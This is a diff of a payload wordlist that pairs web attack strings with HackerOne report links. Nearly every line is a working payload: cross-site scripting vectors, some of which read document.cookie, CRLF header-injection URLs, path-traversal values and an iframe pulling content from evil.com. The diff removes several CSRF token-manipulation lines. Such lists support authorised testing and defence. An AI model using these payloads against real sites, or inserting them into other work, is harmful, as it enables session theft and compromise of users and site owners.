@@ -88,8 +88,6 @@ http://target.com/gallery/iT5l7%22%3E%3Cimg%20src=x%20onerror=alert(1	https://ha
 "'><img src=a onerror=confirm(2)>"><script>alert(1);</script><iframe onload=alert(97)>"><svg onload=alert(2);>"onmouseover="confirm(2);<input onfocus=prompt(1) autofocus>"--> </script><svg/onload=';alert(/XSSPOSED/);'>"	https://hackerone.com/reports/99245
 <img src=a >\"><iframe onload=alert('XSS')>	https://hackerone.com/reports/99245
 alert('script')	https://hackerone.com/reports/100565
-<form method="POST" action="                                         ">	https://hackerone.com/reports/100849
-<input type="hidden" name="authenticity_token" value=""/>	https://hackerone.com/reports/100849
 https://target.com/products/c-of-change?shop=evil.com&style=h%20.product-buy-button{x:expression(alert(1	https://hackerone.com/reports/105659
 javascript:alert(document.domain) //http://target.com/uploads/pwned.jpg	https://hackerone.com/reports/106636
 '"><img src=x onerror=alert(1)>	https://hackerone.com/reports/106678
@@ -190,11 +188,7 @@ http://target.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Prot
 http://target.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E	https://hackerone.com/reports/192667
 http://target.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e	https://hackerone.com/reports/192749
 http://target.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e	https://hackerone.com/reports/192749
-target.com/[app_id]?authenticity_token=[current_user_authenticity_token]	https://hackerone.com/reports/196458
-https://target.com/[attacker's_app]?authenticity_token=[victim's_token]	https://hackerone.com/reports/196458
-https://target.com/img-src-x-onerror-prompt2?reveal_support=true?authenticity_token=[Your_CSRF_TOKEN]&utf8=%E2%9C%93	https://hackerone.com/reports/196458
 <>javascript:alert(document.cookie);	https://hackerone.com/reports/196846
-<img src='https://target.com/steal_csrf_token?html=	https://hackerone.com/reports/199779
 XSS[JaVaScriPt:alert(1)] <-- click to test	https://hackerone.com/reports/200693
 http://target.com/xss?c=%3Cmeta%20http-equiv=%22X-UA-Compatible%22%20content=%22IE=9%22%3E%3Ciframe%20src=%27http://evil.com/github-btn.html?%23%26user=yrdy%3Cscript%3Ealert(document.domain);alert(document.cookie);//%26type=follow%27%3E%3C/iframe%3E	https://hackerone.com/reports/200753
 https://target.com/xss?c=%3Cmeta%20http-equiv=%22X-UA-Compatible%22%20content=%22IE=9%22%3E%3Ciframe%20src=%27https://evil.com/github-btn.html?%23%26user=yrdy%3Cscript%3Ealert(document.domain);alert(document.cookie);//%26type=follow%27%3E%3C/iframe%3E	https://hackerone.com/reports/200826
@@ -616,7 +610,6 @@ http://target.com/JPBC/login.hbc?lang=%3C/SCRIPT%3E%3CSCRIPT%3Ealert(document.do
 alert('Hello: ' + window.parent.location.href);	https://hackerone.com/reports/831962
 <svg>	https://hackerone.com/reports/831962
 <script src=alert.js></script	https://hackerone.com/reports/831962
-<form action="[domain]/wp-admin/users.php">	https://hackerone.com/reports/836187
 {"type":"form-update","element":"#algo-id","value":"/../../../../../users/user?prefs%5Bsend_login_detected_email%5D=false","clientId":"x","roomId":"5ce6e50b298f7c6e0acb68c6"}	https://hackerone.com/reports/837328
 {"type":"form-update","element":"#algo-id","value":"/../../../../../users/user?firstname=h1&lastname=test&bio=hi#","clientId":"x","roomId":"5ce6e50b298f7c6e0acb68c6"}	https://hackerone.com/reports/837328
 </script><script>alert(test)</script>	https://hackerone.com/reports/840515
@@ -911,7 +904,6 @@ luc1d"><img/src="x"onerror=alert(document.domain)>@wearehackerone.com	https://ha
 urban dictionary "><img src=x<	https://hackerone.com/reports/1110229
 2. Now enter the below payload in the First name, last name, company name and title: data: "><img src="                         >/index.html?c=hemantsolo_xss" />	https://hackerone.com/reports/1110243
 <img src=x onerror=alert(document.cookie)>	https://hackerone.com/reports/1122513
-<form action="                            ">	https://hackerone.com/reports/1124540
 "><div onmouseover="alert('XSS');">Hello :)                                                                                                                            "><div onmouseover="alert('XSS');">Hello :)	https://hackerone.com/reports/1126433
 irb(main):029:0> Tempfile.open(["\\..\\..\\..\\..\\..\\Users\\rootx\\malicious",".rb"])	https://hackerone.com/reports/1131465
 Meteor.call('createChannel', 'valid-name', [], false, {}, { name: 'edit me <img src onerror=alert(origin)>' })	https://hackerone.com/reports/1132202
